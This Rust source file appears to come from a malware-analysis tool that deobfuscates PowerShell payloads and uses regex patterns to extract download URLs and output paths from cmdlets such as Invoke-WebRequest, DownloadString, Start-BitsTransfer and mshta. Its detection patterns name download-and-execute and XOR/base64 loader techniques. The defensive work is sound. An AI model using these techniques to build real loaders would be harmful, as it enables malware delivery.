//! PowerShell payload post-processing: extract URLs and other IOCs from
//! the decoded ps1 content of `env.exec_ps1` / `env.all_extracted_ps1`.
//!
//! Runs our regex-based obfuscation expander over the raw payload, then
//! applies URL-extraction patterns to the simplified source.

#![allow(clippy::items_after_test_module)]

use crate::env::{Environment, FsEntry};
use crate::traits::Trait;
use crate::util::{
    contains_ascii_case_insensitive, find_ascii_case_insensitive_from, floor_char_boundary,
    looks_like_liberal_url,
};
use base64::Engine as _;
use once_cell::sync::Lazy;
use regex::Regex;

// Regex-set patterns. Each capture group #1 is the URL.
// Patterns target common cmdlet/method invocations. Whitespace-tolerant,
// case-insensitive, supports single+double quoted strings.

#[allow(clippy::expect_used)] // regex literals — compile-time constants
static PS_CMDLET_QUOTED_DQ_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|wget|curl)\b[^\n|;]*?(?:-(?:Uri|Ur)(?:\s+|:|=)|\s)\(?\s*"((?:https?|ftp|file):[\x2f\x5c]+[^"\r\n]+)""#,
    )
    .expect("ps cmdlet quoted double url")
});

#[allow(clippy::expect_used)]
static PS_CMDLET_QUOTED_SQ_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|wget|curl)\b[^\n|;]*?(?:-(?:Uri|Ur)(?:\s+|:|=)|\s)\(?\s*'((?:https?|ftp|file):[\x2f\x5c]+[^'\r\n]+)'"#,
    )
    .expect("ps cmdlet quoted single url")
});

#[allow(clippy::expect_used)]
static IWR_RE: Lazy<Regex> = Lazy::new(|| {
    // Invoke-WebRequest / iwr / wget / curl (PS alias) — optional -Uri, quoted or unquoted URL
    Regex::new(
        r#"(?i)(?:Invoke-WebRequest|iwr|wget|curl)\b(?:\s+-[A-Za-z][\w-]*)*\s*(?:[^\n|;]*?-Uri(?:\s+|:|=))?\(?\s*["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"'\);]+)["']?"#
    ).expect("iwr")
});

#[allow(clippy::expect_used)]
static IRM_RE: Lazy<Regex> = Lazy::new(|| {
    // Invoke-RestMethod / irm — optional -Uri, quoted or unquoted URL
    Regex::new(
        r#"(?i)(?:Invoke-RestMethod|irm)\b(?:\s+-[A-Za-z][\w-]*)*\s*(?:[^\n|;]*?-Uri(?:\s+|:|=))?\(?\s*["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"'\);]+)["']?"#
    ).expect("irm")
});

#[allow(clippy::expect_used)]
static PS_ENV_REF_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)\$env:([A-Za-z0-9_.-]+)"#).expect("ps env ref"));

#[allow(clippy::expect_used)]
static PS_SCHEMELESS_IP_CMDLET_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|wget|curl)\b(?:[^\n|;]*?-(?:Uri|Ur)(?:\s+|:|=)|(?:\s+-[A-Za-z][\w-]*)*\s+)(?:['"])?((?:\d{1,3}\.){3}\d{1,3}(?::\d+)?(?:/[^\s"'\);]*)?)(?:['"])?"#,
    )
    .expect("ps schemeless ip cmdlet")
});

#[allow(clippy::expect_used)]
static PS_SCHEMELESS_DOMAIN_CMDLET_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?ix)
            (?: Invoke-WebRequest | Invoke-RestMethod | iwr | irm | wget | curl ) \b
            (?: [^\n|;]*? - (?: Uri | Ur ) (?: \s+ | : | = ) | (?: \s+ -[A-Za-z][\w-]* )* \s+ )
            (?: ['"] )?
            (
                (?: [a-z0-9\-]+ \. ){1,4}
                (?: com | net | org | io | ru | cn | me | info | biz | us | co | ly | gg | tk | xyz
                  | top | life | store | app | tools | rocks | click | stream | host | website
                  | pw | dev | sh | space | site | live | cloud | online | tech | art | news | pro | cc | to )
                / [^\s"'\);<>]{1,200}
            )
            (?: ['"] )?
        "#,
    )
    .expect("ps schemeless domain cmdlet")
});

#[allow(clippy::expect_used)]
static CURL_EXE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|[\s;"'])[\w:./\\-]*curl\.exe\b(?:\s+-[A-Za-z][\w-]*(?:\s+["']?[^"'\s]+["']?)?)*\s+["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"'\)]+)["']?"#,
    )
    .expect("curl exe")
});

#[allow(clippy::expect_used)]
static MSHTA_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\bmshta(?:\.exe)?\s+["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"';\)]+)["']?"#)
        .expect("mshta url")
});

#[allow(clippy::expect_used)]
static PS_GENERIC_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\b((?:https?|ftp|file):[\x2f\x5c]+[^\s"'`;,<>\)\]\}]+)"#)
        .expect("ps generic url")
});

#[allow(clippy::expect_used)]
static PS_URL_ASSIGNMENT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)^\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*="#).expect("ps url assignment")
});

#[allow(clippy::expect_used)]
static BATCH_SET_URL_ASSIGNMENT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)^\s*@?set\s+"?([A-Za-z_][A-Za-z0-9_]*)\s*="#)
        .expect("batch set url assignment in ps scan")
});

#[allow(clippy::expect_used)]
static DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
    // (New-Object Net.WebClient).DownloadString('url') or .DownloadFile('url', 'dst')
    Regex::new(r#"(?i)\.Download(?:String|File|Data)\s*\(\s*["']([^"']+)["']"#).expect("ds")
});

#[allow(clippy::expect_used)]
static DOWNLOADFILE_DST_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(?:\.|\b)DownloadFile\s*\(\s*["'][^"']+["']\s*,\s*(?:"([^"]+)"|'([^']+)')"#)
        .expect("downloadfile dst")
});

#[allow(clippy::expect_used)]
static BARE_DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\bDownload(?:String|File|Data)\s*\(\s*["']([^"']+)["']"#)
        .expect("bare downloadstring")
});

#[allow(clippy::expect_used)]
static DOWNLOADSTRING_FRAGMENT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\b(?:loadString|ADSTRING)\s*\(\s*'{1,2}(https?://[^'")]+)"#)
        .expect("downloadstring fragment")
});

#[allow(clippy::expect_used)]
static DAMAGED_WEBCLIENT_CONSTRUCTOR_METHOD_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(New-Object\s+(?:-TypeName\s+)?(?:System\.)?Net\.WebClient)\.(Download(?:File|String|Data)\s*\()"#,
    )
    .expect("damaged webclient constructor method")
});

#[allow(clippy::expect_used)]
static CALLBYNAME_DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)CallByname\s*\([^)]*?["']DownloadString["'][^)]*?["'](https?://[^"']+)["']"#)
        .expect("callbyname downloadstring")
});

#[allow(clippy::expect_used)]
static SELF_B64_MATCH_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)-match\s*['"]([^'"]{4,200}?)\(\[A-Za-z0-9\+/=(?:\{\})?\]\+\)['"]"#)
        .expect("self b64 match regex")
});

#[allow(clippy::expect_used)]
static FILE_B64_XOR_LOADER_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(\d{1,3})\s*;.*?\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\(?\s*(?:gc|cat|Get-Content)\b(?:\s+-(?:Raw|Path|LiteralPath))*\s+['"]([^'"]+)['"](?:\s+-(?:Raw))*\s*\)?(?:\s*-join\s*['"]{2})?.*?\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\).*?-bxor\s*\$([A-Za-z_][A-Za-z0-9_]*)"#,
    )
    .expect("file b64 xor loader regex")
});

#[allow(clippy::expect_used)]
static INLINE_XOR_KEY_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?:\[[A-Za-z0-9_.]+(?:\[\])?\]\s*)?@?\(\s*((?:\d{1,3}\s*,\s*)*\d{1,3})\s*\)"#)
        .expect("inline xor key array regex")
});

#[allow(clippy::expect_used)]
static INLINE_XOR_FUNCTION_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\bfunction\s+([A-Za-z_][A-Za-z0-9_]*)\b.*?-bxor\s*\$([A-Za-z_][A-Za-z0-9_]*)"#,
    )
    .expect("inline xor function regex")
});

#[allow(clippy::expect_used)]
static INLINE_XOR_CALL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)\b([A-Za-z_][A-Za-z0-9_]*)\s+['"]([A-Za-z0-9+/=]{32,})['"]"#)
        .expect("inline xor call regex")
});

#[allow(clippy::expect_used)]
static FILE_B64_LOADER_PATH_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:\bgc\b|\bGet-Content\b)\s+(?:\$([A-Za-z_][A-Za-z0-9_]*)|['"]([^'"]+)['"])"#,
    )
    .expect("file b64 loader path regex")
});

#[allow(clippy::expect_used)]
static PS_ANY_STRING_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?:'([^']{1,1024})'|"([^"]{1,1024})")"#)
        .expect("ps any string assign regex")
});

#[allow(clippy::expect_used)]
static PS_PATH_COMBINE_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\[(?:System\.)?IO\.Path\]::Combine\s*\(\s*([^,\r\n;]{1,512})\s*,\s*(?:'([^']{1,255})'|"([^"]{1,255})")\s*\)"#,
    )
    .expect("ps path combine assign regex")
});

#[allow(clippy::expect_used)]
static PS_EMPTY_REPLACE_OPERATOR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)-replace\s*['"]([^'"]{1,128})['"]\s*,\s*['"]{2}"#)
        .expect("ps empty replace operator regex")
});

#[allow(clippy::expect_used)]
static START_BITS_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)Start-BitsTransfer\s+(?:[^|]*?-Source\s+)?["']([^"']+)["']"#).expect("bits")
});

#[allow(clippy::expect_used)]
static START_BITS_SCHEMELESS_SOURCE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?ix)
            Start-BitsTransfer \b
            [^\n|;]*? -S(?:o(?:u(?:r(?:c(?:e)?)?)?)?)? (?: \s+ | : | = )
            (?: ['"] )?
            (
                (?: [a-z0-9\-]+ \. ){1,4}
                (?: com | net | org | io | ru | cn | me | info | biz | us | co | ly | gg | tk | xyz
                  | top | life | store | app | tools | rocks | click | stream | host | website
                  | pw | dev | sh | space | site | live | cloud | online | tech | art | news | pro | cc | to )
                / [^\s"'\);<>]{1,200}
            )
            (?: ['"] )?
        "#,
    )
    .expect("bits schemeless source")
});

#[allow(clippy::expect_used)]
static NET_REQ_RE: Lazy<Regex> = Lazy::new(|| {
    // [Net.WebRequest]::Create('url')  /  [System.Net.WebRequest]::Create('url')
    Regex::new(r#"(?i)\[(?:System\.)?Net\.WebRequest\]::Create\s*\(\s*["']([^"']+)["']"#)
        .expect("netreq")
});

#[allow(clippy::expect_used)]
static DYNAMIC_DOWNLOAD_INVOKE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\.\s*\(?\s*["'](?:Download(?:String(?:Task)?Async|String|File|Data)|OpenReadAsync|Down)["']\s*\)?\s*\.Invoke\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*)|["']([^"']+)["'])"#,
    )
    .expect("dynamic download invoke")
});

#[allow(clippy::expect_used)]
static DYNAMIC_VAR_METHOD_INVOKE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\.\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\.Invoke\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*)|["']([^"']+)["'])"#,
    )
    .expect("dynamic variable method invoke")
});

#[allow(clippy::expect_used)]
static FOREACH_LITERAL_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)foreach\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s+in\s+@\(\s*(.*?)\s*\)\s*\)"#)
        .expect("foreach literal array")
});

#[allow(clippy::expect_used)]
static PS_ARRAY_LITERAL_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*@\(\s*(.*?)\s*\)"#)
        .expect("ps array literal assignment")
});

#[allow(clippy::expect_used)]
static FOREACH_ARRAY_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)foreach\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s+in\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
    )
    .expect("foreach array variable")
});

#[allow(clippy::expect_used)]
static PS_QUOTED_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?s)'((?:[^'\\]|\\.)*)'|"((?:[^"\\]|\\.)*)""#).expect("ps quoted literal")
});

#[allow(clippy::expect_used)]
static OUTFILE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)-Out(?:F(?:ile)?)?(?:\s+|:|=)(?:`"([^"`\r\n;]+)`"|"([^"\r\n;]+)"?|'([^'\r\n;]+)'?|([^"'\s;]+))"#,
    )
    .expect("outfile")
});

#[allow(clippy::expect_used)]
static CURL_OUTPUT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|\s)(?:--output(?:\s+|:|=)|-o\s+)(?:'([^'\r\n;]+)'?|"([^"\r\n;]+)"?|([^"'\s;]+))|(?:^|\s)-[A-Za-z]*o(?:'([^'\r\n;]+)'?|"([^"\r\n;]+)"?|((?:[A-Za-z]:|[\\/])[^"'\s;]+))"#,
    )
    .expect("curl output")
});

#[allow(clippy::expect_used)]
static BITS_DESTINATION_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)-Dest(?:ination)?(?:\s+|:|=)(?:"([^"\r\n;]+)"?|'([^'\r\n;]+)'?|([^"'\s;]+))"#)
        .expect("bits destination")
});

// ---- PowerShell obfuscation expansion pre-pass ----

fn logical_statement_at(text: &str, pos: usize) -> &str {
    let start = text[..pos]
        .rfind(['\r', '\n', ';'])
        .map_or(0, |idx| idx + 1);
    let end = text[pos..]
        .find(['\r', '\n', ';'])
        .map_or(text.len(), |idx| pos + idx);
    text[start..end].trim()
}

fn outfile_hint_from(text: &str) -> Option<String> {
    OUTFILE_RE
        .captures(text)
        .or_else(|| CURL_OUTPUT_RE.captures(text))
        .or_else(|| BITS_DESTINATION_RE.captures(text))
        .or_else(|| DOWNLOADFILE_DST_RE.captures(text))
        .and_then(|c| capture_first_group(&c))
        .or_else(|| bits_positional_destination_from(text))
}

fn capture_first_group(captures: &regex::Captures<'_>) -> Option<String> {
    captures
        .iter()
        .skip(1)
        .flatten()
        .next()
        .map(|m| clean_ps_argument_literal(m.as_str()))
}

fn clean_ps_argument_literal(value: &str) -> String {
    value
        .trim()
        .replace("`\"", "\"")
        .replace("`'", "'")
        .trim_matches(['"', '\''])
        .to_string()
}

fn bits_positional_destination_from(text: &str) -> Option<String> {
    if !contains_ascii_case_insensitive(text, "start-bitstransfer") {
        return None;
    }
    let literals: Vec<String> = PS_QUOTED_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            caps.get(1)
                .or_else(|| caps.get(2))
                .map(|m| m.as_str().to_string())
        })
        .collect();
    let url_idx = literals.iter().position(|literal| {
        crate::deob_scan::normalize_liberal_url_token(&clean_ps_url(literal)).is_some()
    })?;
    literals
        .iter()
        .skip(url_idx + 1)
        .find(|literal| crate::deob_scan::normalize_liberal_url_token(literal).is_none())
        .cloned()
}

const PS_SIDE_EFFECT_EXPAND_MAX_BYTES: usize = 1_000_000;

#[allow(dead_code)]
pub(crate) fn ps_download_side_effects(text: &str) -> Vec<(String, String)> {
    ps_download_side_effects_until(text, None).0
}

pub(crate) fn ps_download_side_effects_until(
    text: &str,
    deadline: Option<std::time::Instant>,
) -> (Vec<(String, String)>, bool) {
    if ps_deadline_expired(deadline) {
        return (Vec::new(), true);
    }
    if text.len() > PS_SIDE_EFFECT_EXPAND_MAX_BYTES {
        return (Vec::new(), false);
    }
    let (text_expanded, timed_out) = if looks_like_dense_skip_nth_payload(text) {
        (expand_dense_skip_nth_payload(text), false)
    } else if looks_like_for_substring_stride_payload(text) {
        (expand_for_substring_stride_fast_path_payload(text), false)
    } else {
        expand_obfuscation_until(text, deadline)
    };
    if timed_out {
        return (Vec::new(), true);
    }
    let text_aliased = crate::ps_alias::expand_aliases_if_ps(&text_expanded);
    let candidates: Vec<String> = if text_aliased != text_expanded {
        vec![text_expanded, text_aliased]
    } else {
        vec![text_expanded]
    };
    let regexes: &[&Lazy<Regex>] = &[
        &IWR_RE,
        &IRM_RE,
        &PS_SCHEMELESS_IP_CMDLET_RE,
        &PS_SCHEMELESS_DOMAIN_CMDLET_RE,
        &CURL_EXE_RE,
        &DOWNLOADSTRING_RE,
        &BARE_DOWNLOADSTRING_RE,
        &START_BITS_RE,
        &START_BITS_SCHEMELESS_SOURCE_RE,
    ];
    let mut out = Vec::new();
    let mut seen = std::collections::HashSet::new();

    for text in &candidates {
        for re in regexes {
            if ps_deadline_expired(deadline) {
                return (out, true);
            }
            for caps in re.captures_iter(text) {
                let Some(url_match) = caps.get(1) else {
                    continue;
                };
                if ps_url_inside_non_download_hash_option(text, url_match.start())
                    || ps_url_is_non_download_option_value(text, url_match.start())
                    || ps_url_inside_path_getfilename(text, url_match.start())
                {
                    continue;
                }
                let statement = caps
                    .get(0)
                    .map(|m| logical_statement_at(text, m.start()))
                    .unwrap_or(text);
                let Some(dst) = outfile_hint_from(statement) else {
                    continue;
                };
                let mut url = clean_ps_url(url_match.as_str());
                if is_schemeless_ip_url(&url) {
                    url = format!("http://{url}");
                }
                let Some(src) = crate::deob_scan::normalize_liberal_url_token(&url)
                    .or_else(|| crate::deob_scan::normalize_schemeless_domain_path_token(&url))
                else {
                    continue;
                };
                if seen.insert((src.clone(), dst.clone())) {
                    out.push((src, dst));
                }
            }
        }
    }

    (out, false)
}

#[allow(clippy::expect_used)]
static CHAR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    // Must have at least two + separators (3+ [char] terms) to avoid matching plain [char]N
    Regex::new(r"(?i)(?:\[char\]\s*\(?\s*(?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*\s*\)?\s*\+\s*){2,}\[char\]\s*\(?\s*(?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*\s*\)?")
        .expect("char concat regex")
});

#[allow(clippy::expect_used)]
static CHAR_INNER_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)\[char\]\s*\(?\s*((?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*)\s*\)?",
    )
    .expect("inner char regex")
});

#[allow(clippy::expect_used)]
static CHAR_LITERAL_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[char\]\s*\(?\s*((?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*)\s*\)?\s*\+\s*(?:'((?:''|[^'])*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)")"#,
    )
    .expect("char literal concat regex")
});

fn expand_char_concat(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "[char]") || !text.contains('+') {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = CHAR_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            let s = m.as_str();
            let mut chars = Vec::new();
            // Inner regex to extract each [char]N value
            for cap in CHAR_INNER_RE.captures_iter(s) {
                let n = parse_ps_char_codepoint(cap.get(1)?.as_str())?;
                if let Some(c) = char::from_u32(n) {
                    chars.push(c);
                }
            }
            let s_out: String = chars.into_iter().collect();
            Some((m.start(), m.end(), format!("'{}'", s_out)))
        })
        .collect();
    let mut result = text.to_string();
    // Apply replacements in reverse so byte offsets stay valid
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

fn expand_char_literal_concat(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "[char]") || !text.contains('+') {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = CHAR_LITERAL_CONCAT_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let ch = char::from_u32(parse_ps_char_codepoint(caps.get(1)?.as_str())?)?;
            let literal = caps
                .get(2)
                .map(|m| m.as_str().replace("''", "'"))
                .or_else(|| caps.get(3).map(|m| m.as_str().to_string()))?;
            let value = format!("{ch}{literal}").replace('\'', "''");
            Some((full.start(), full.end(), format!("'{value}'")))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

fn parse_ps_char_codepoint(expr: &str) -> Option<u32> {
    let expr = expr.trim();
    if expr.is_empty() {
        return None;
    }
    if let Some(value) = parse_ps_char_codepoint_atom(expr) {
        return Some(value);
    }

    let mut acc = 0i64;
    let mut sign = 1i64;
    let mut start = 0usize;
    let mut saw_operator = false;
    let mut saw_term = false;
    let bytes = expr.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'+' | b'-' => {
                let term = expr[start..i].trim();
                if term.is_empty() {
                    if !saw_term {
                        sign = if bytes[i] == b'-' { -1 } else { 1 };
                        start = i + 1;
                        i += 1;
                        continue;
                    }
                    return None;
                }
                acc += sign * i64::from(parse_ps_char_codepoint_atom(term)?);
                saw_term = true;
                saw_operator = true;
                sign = if bytes[i] == b'-' { -1 } else { 1 };
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    let term = expr[start..].trim();
    if term.is_empty() {
        return None;
    }
    acc += sign * i64::from(parse_ps_char_codepoint_atom(term)?);
    if saw_operator && (0..=i64::from(u32::MAX)).contains(&acc) {
        Some(acc as u32)
    } else {
        None
    }
}

fn parse_ps_char_codepoint_atom(expr: &str) -> Option<u32> {
    let expr = expr.trim();
    if let Some(stripped) = expr.strip_prefix("0x").or_else(|| expr.strip_prefix("0X")) {
        u32::from_str_radix(stripped, 16).ok()
    } else {
        expr.parse().ok()
    }
}

#[cfg(test)]
mod char_concat_prefilter_tests {
    use super::expand_char_concat;

    #[test]
    fn ignores_text_without_char_concat_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_char_concat(text), text);
    }
}

#[allow(clippy::expect_used)]
static STR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    // Match runs of (quoted-string + )+ quoted-string.
    Regex::new(r#"(?:(?:\(\s*'(?:[^'\\]|\\.)*'\s*\)|'(?:[^'\\]|\\.)*')\s*\+\s*)+(?:\(\s*'(?:[^'\\]|\\.)*'\s*\)|'(?:[^'\\]|\\.)*')"#)
        .expect("str concat regex")
});

#[allow(clippy::expect_used)]
static STR_PART_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"'((?:[^'\\]|\\.)*)'"#).expect("string part regex"));

fn expand_string_concat(text: &str) -> String {
    if !text.contains('\'') || !text.contains('+') {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = STR_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            if !is_string_concat_start(text, m.start()) {
                return None;
            }
            let s = m.as_str();
            let mut combined = String::new();
            for cap in STR_PART_RE.captures_iter(s) {
                let part_str = cap.get(1)?.as_str();
                combined.push_str(part_str);
            }
            Some((m.start(), m.end(), format!("'{}'", combined)))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

#[cfg(test)]
mod string_concat_prefilter_tests {
    use super::{expand_double_string_concat, expand_string_concat};

    #[test]
    fn ignores_text_without_string_concat_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_string_concat(text), text);
        assert_eq!(expand_double_string_concat(text), text);
    }
}

#[allow(clippy::expect_used)]
static DQ_STR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?:\"(?:[^\"\\]|\\.)*\"\s*\+\s*)+\"(?:[^\"\\]|\\.)*\""#)
        .expect("double quoted str concat regex")
});

#[allow(clippy::expect_used)]
static DQ_STR_PART_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"\"((?:[^\"\\]|\\.)*)\""#).expect("double string part regex"));

fn expand_double_string_concat(text: &str) -> String {
    if !text.contains('"') || !text.contains('+') {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = DQ_STR_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            if !is_string_concat_start(text, m.start()) {
                return None;
            }
            let s = m.as_str();
            let mut combined = String::new();
            for cap in DQ_STR_PART_RE.captures_iter(s) {
                combined.push_str(cap.get(1)?.as_str());
            }
            Some((m.start(), m.end(), format!("'{}'", combined)))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

fn is_string_concat_start(text: &str, pos: usize) -> bool {
    match previous_non_whitespace_ascii_byte(text, pos) {
        None => true,
        Some(b) => matches!(
            b,
            b'=' | b'(' | b'[' | b'{' | b',' | b';' | b':' | b'?' | b'+'
        ),
    }
}

#[allow(clippy::expect_used)]
static DOUBLED_QUOTE_LITERAL_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"''([^'\r\n]{1,8192})''"#).expect("doubled quote literal"));

fn expand_doubled_quote_literals(text: &str) -> String {
    if !text.contains("''") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = DOUBLED_QUOTE_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let inner = caps.get(1)?.as_str();
            Some((full.start(), full.end(), format!("'{inner}'")))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod doubled_quote_literal_tests {
    use super::expand_doubled_quote_literals;

    #[test]
    fn doubled_quote_expansion_preserves_empty_single_quoted_argument() {
        let text = "Clean 'abc' '~' ''";

        let out = expand_doubled_quote_literals(text);

        assert_eq!(out, text);
    }
}

#[allow(clippy::expect_used)]
static FORMAT_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\(?\s*(?:'([^']*)'|"([^"]*)")\s*\)?\s*-f\s*((?:(?:'[^']*'|"[^"]*")\s*,\s*)*(?:'[^']*'|"[^"]*"))"#,
    )
    .expect("format literal")
});

#[allow(clippy::expect_used)]
static FORMAT_CONCAT_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\(?\s*((?:'[^']*'\s*\+\s*)+'[^']*')\s*\)?\s*-f\s*((?:'[^']*'\s*,\s*)*'[^']*')"#)
        .expect("format concat literal")
});

#[allow(clippy::expect_used)]
static FORMAT_ARG_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"'([^']*)'|"([^"]*)""#).expect("format arg literal"));

#[allow(clippy::expect_used)]
static STRING_FORMAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?String\]::Format\s*\(\s*(?:'([^']*)'|"([^"]*)")\s*,\s*((?:(?:'[^']*'|"[^"]*")\s*,\s*)*(?:'[^']*'|"[^"]*"))\s*\)"#,
    )
    .expect("string format")
});

fn expand_format_literals(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-f") {
        return text.to_string();
    }
    let concat_matches: Vec<(usize, usize, String)> = FORMAT_CONCAT_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let template_parts = caps.get(1)?.as_str();
            let mut template = String::new();
            for part in STR_PART_RE.captures_iter(template_parts) {
                template.push_str(part.get(1)?.as_str());
            }
            let args = caps.get(2)?.as_str();
            Some((
                full.start(),
                full.end(),
                format_format_literal(template, args)?,
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in concat_matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }

    let matches: Vec<(usize, usize, String)> = FORMAT_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let template = caps
                .get(1)
                .or_else(|| caps.get(2))
                .map(|m| m.as_str().to_string())?;
            let args = caps.get(3)?.as_str();
            let before = text[..full.start()].trim_end();
            if before.ends_with('+') {
                return None;
            }
            Some((
                full.start(),
                full.end(),
                format_format_literal(template, args)?,
            ))
        })
        .collect();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
